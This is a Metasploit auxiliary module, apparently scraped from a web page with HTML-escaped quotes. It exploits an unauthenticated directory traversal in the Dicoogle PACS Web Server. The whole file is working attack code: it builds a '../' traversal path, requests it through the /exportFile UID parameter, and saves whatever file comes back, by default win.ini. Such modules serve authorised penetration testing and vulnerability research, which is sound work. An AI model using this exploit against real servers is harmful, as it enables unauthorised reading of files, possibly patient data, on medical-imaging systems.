# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;        => &#039;Dicoogle PACS Web Server Directory Traversal&#039;,
      &#039;Description&#039; => %q{
        This module exploits an unauthenticated directory traversal vulnerability
        in the Dicoogle PACS Web Server v2.5.0 and possibly earlier, allowing an
        attacker to read arbitrary files with the web server privileges.
        While the application is java based, the directory traversal was only
        successful against Windows targets.
      },
      &#039;References&#039;  =>
        [
          [&#039;EDB&#039;, &#039;45007&#039;]
        ],
      &#039;Author&#039;      =>
        [
          &#039;Carlos Avila&#039;, # Vulnerability discovery
          &#039;h00die&#039; # Metasploit module
        ],
      &#039;DisclosureDate&#039; => &#039;Jul 11 2018&#039;,
      &#039;License&#039;     => MSF_LICENSE
    ))

    register_options(
      [
        Opt::RPORT(8080),
        OptString.new(&#039;FILEPATH&#039;, [true, "The path to the file to read", &#039;/windows/win.ini&#039;]),
        OptInt.new(&#039;DEPTH&#039;, [ true, &#039;Traversal Depth (to reach the root folder)&#039;, 15 ])
      ])

  end

  def run_host(ip)
    filename = datastore[&#039;FILEPATH&#039;]
    traversal = "../" * datastore[&#039;DEPTH&#039;] << filename

    res = send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => &#039;/exportFile&#039;,
      &#039;vars_get&#039; => {
        &#039;UID&#039; => traversal
      }
    })

    unless res && res.code == 200
      print_error(&#039;Nothing was downloaded&#039;)
      return
    end

    vprint_good("#{peer} - #{res.body}")
    path = store_loot(
      &#039;dicoogle.traversal&#039;,
      &#039;text/plain&#039;,
      ip,
      res.body,
      filename
    )
    print_good("File saved in: #{path}")
  end
end

